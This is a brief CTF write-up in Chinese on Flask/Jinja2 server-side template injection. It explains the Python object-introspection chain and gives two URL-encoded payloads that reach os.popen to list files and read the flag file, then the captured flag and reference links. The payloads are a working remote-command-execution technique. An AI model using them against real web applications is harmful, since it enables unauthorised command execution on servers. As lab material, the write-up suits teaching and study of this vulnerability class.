# Web_Python_Template_Injection

> flask ssti注入

## 思路分析

> \_\_class\_\_  返回类型所属的对象
> \_\_mro\_\_    返回一个包含对象所继承的基类元组,方法在解析时按照元组的顺序解析
> \_\_base\_\_   返回该对象所继承的基类
> \_\_base\_\_和\_\_mro\_\_    都是用来寻找基类的
> \_\_subclasses\_\_   每个新类都保留了子类的引用,这个方法返回一个类中仍然可用的的引用的列表
> \_\_init\_\_  类的初始化方法
> \_\_globals\_\_  对包含函数全局变量的字典的引用

> flask ssti注入,找到一步一步的找到利用链条即可

## payload

> %7B%7B''.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[71].\_\_init\_\_.\_\_globals\_\_['os'].popen('ls').read()%7D%7D

> %7B%7B''.\_\_class\_\_.\_\_mro__[2].\_\_subclasses\_\_()[71].\_\_init\_\_.\_\_globals\_\_['os'].popen('cat%20fl4g').read()%7D%7D

## flag

> ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}

## 参考

> https://xz.aliyun.com/t/3679
> https://blog.csdn.net/qq_45774670/article/details/110223398